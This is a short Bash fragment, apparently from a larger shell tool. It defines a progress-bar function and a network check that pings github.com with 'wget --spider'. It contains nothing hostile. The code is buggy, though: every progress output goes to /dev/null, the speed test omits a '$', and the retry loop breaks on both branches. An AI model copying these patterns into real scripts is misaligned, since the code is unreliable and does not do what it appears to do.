loading_bar() {
    for ((i=0; i<=100; i+=10)); do
        echo -ne "Loading: $i% ["&>> /dev/null
        for ((j=0; j<i/10; j++)); do
            echo -ne "=" &>> /dev/null
        done
        for ((j=i/10; j<10; j++)); do
            echo -ne " " &>> /dev/null
        done
        echo -ne "]\r" &>> /dev/null
	if [[ speed_num == '' ]];then
        sleep 0.1
	else
	sleep $speed_num
	fi

    done
    echo "Loading complete!" &>> /dev/null
}

# Check if offline
net() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" = 0 ]; then

	    nN='Y'
	    NnEt="Connected To Network [★]"

	break
       else
		nN='N'
		NnEt="No Internet [X] "
		break
        fi
    done
}

